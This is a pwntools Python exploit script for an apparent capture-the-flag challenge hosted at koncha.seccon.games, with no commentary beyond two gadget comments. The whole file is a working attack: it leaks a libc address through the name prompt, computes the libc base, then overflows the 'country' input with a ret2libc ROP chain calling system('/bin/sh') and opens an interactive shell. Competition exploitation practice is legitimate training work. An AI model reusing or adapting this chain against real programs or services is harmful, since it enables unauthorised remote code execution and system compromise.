#!/usr/bin/python3
from pwn import *
gs = '''
continue
'''
elf = context.binary = ELF('./chall')
context.terminal = ['tmux', 'splitw', '-hp', '70']
libc = elf.libc

def start():
    if args.GDB:
        return gdb.debug('./chall', gdbscript=gs)
    if args.REMOTE:
        return remote('koncha.seccon.games', 9001)
    else:
        return process('./chall')
r = start()
#========= exploit here ===================

payload = b"\n"


r.sendlineafter(b"Hello! What is your name?", payload)

r.recvuntil(b"Nice to meet you, ")
leak = u64(r.recvline().strip()[:6].ljust(8,b"\x00"))


log.info(f"leak = {hex(leak)}")
libc.address = leak - 0x1f12e8
log.info(f"libc = {hex(libc.address)}")

#0x0000000000023b6a: pop rdi; ret;
#0x0000000000022679: ret;

evil = b"B"*0x58
#evil += b"AAAAAAAA"

evil += p64(libc.address+0x0000000000022679)
evil += p64(libc.address+0x0000000000023b6a)

evil += p64(next(libc.search(b"/bin/sh")))
evil += p64(libc.sym.system)


r.sendlineafter(b"Which country do you live in?", evil)


#========= interactive ====================
r.interactive()
